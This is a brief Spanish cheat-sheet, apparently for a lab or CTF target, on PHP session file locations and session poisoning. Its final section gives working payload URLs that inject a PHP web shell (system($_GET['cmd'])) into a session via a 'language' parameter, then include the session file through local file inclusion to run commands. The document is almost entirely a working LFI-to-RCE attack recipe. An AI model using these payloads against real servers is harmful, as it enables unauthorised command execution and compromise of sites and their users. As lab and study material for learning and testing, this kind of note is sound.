## Valor de PHPSESSID (EJEMPLO)

```python
PHPSESSID = el4ukv0kqbvoirg7nkp4dncpk3
```

## Como se almacena

```python
sess_el4ukv0kqbvoirg7nkp4dncpk3
```

## Rutas de almacenamiento dependiendo el sistema operativo

## Windows

```python
C:\Windows\Temp

C:\Windows\Temp\sess_el4ukv0kqbvoirg7nkp4dncpk3
```

## Linux

```python
/var/lib/php/sessions/

/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
```

## Envenenamiento

```python
http://10.10.10.216/index.php?language=<?php system($_GET['cmd']); ?>
 
http://10.10.10.216/index.php?language=/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3&cmd=id
```
